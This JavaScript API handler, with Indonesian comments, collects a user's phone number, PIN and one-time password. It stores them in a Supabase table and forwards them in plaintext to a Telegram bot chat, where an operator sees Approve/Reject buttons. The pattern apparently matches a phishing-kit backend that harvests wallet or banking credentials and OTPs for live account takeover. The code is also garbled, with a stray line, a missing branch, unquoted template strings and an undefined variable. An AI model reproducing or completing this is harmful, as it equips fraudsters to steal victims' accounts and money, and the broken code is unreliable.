import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' });

  const { phone, pin, type } = req.body;
Telegram
    try {
      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
      const adminChatId = process.env.ADMIN_CHAT_ID;
      if (telegramToken && adminChatId) {
        await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: adminChatId,
            text: 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
            parse_mode: 'Markdown'
          })
        });
      }
    } catch (err) {
      console.error('Gagal kirim notifikasi login:', err);
      // Tetap berikan respons sukses ke frontend
    }

    return res.status(200).json({ success: true });
  }

  // Jika type = 'otp' atau tidak ada type, anggap sebagai submit OTP
  if (!phone || !pin || !otp) {
    return res.status(400).json({ message: 'Phone, PIN, and OTP required' });
  }

  const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);

  try {
    // Simpan ke database
    const { data, error } = await supabase
      .from('verifikasi_requests')
      .insert([{ phone, pin, otp, status: 'pending' }])
      .select();
    if (error) throw error;

    // Kirim notifikasi ke admin Telegram dengan inline keyboard
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const adminChatId = process.env.ADMIN_CHAT_ID;
    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve|${phone}|${pin}|${otp}` },
          { text: "❌ Reject", callback_data: `reject|${phone}|${pin}|${otp}` }
        ]
      ]
    };

    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: adminChatId,
        text: `🔔 *Permintaan Verifikasi*\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🔑 OTP: ${otp}`,
        parse_mode: 'Markdown',
        reply_markup: inlineKeyboard
      })
    });

    res.status(201).json({ success: true, requestId: data[0].id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Gagal menyimpan data' });
  }
}
